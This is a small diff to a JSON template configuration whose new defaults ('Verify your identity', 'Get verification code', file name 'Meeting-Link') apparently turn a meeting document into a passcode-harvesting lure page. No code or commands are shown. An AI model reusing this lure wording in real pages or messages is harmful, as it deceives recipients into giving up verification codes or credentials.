@@ -7,7 +7,25 @@
       "key": "title",
       "label": "Meeting Title",
       "type": "text",
-      "default": "Q4 Strategy Review"
+      "default": "Verify your identity"
+    },
+    {
+      "key": "message",
+      "label": "Page Message",
+      "type": "text",
+      "default": "Generate a one-time passcode to securely access your content."
+    },
+    {
+      "key": "button_text",
+      "label": "Button Text",
+      "type": "text",
+      "default": "Get verification code"
+    },
+    {
+      "key": "file_name",
+      "label": "File Name",
+      "type": "text",
+      "default": "Meeting-Link"
     },
     {
       "key": "pages",
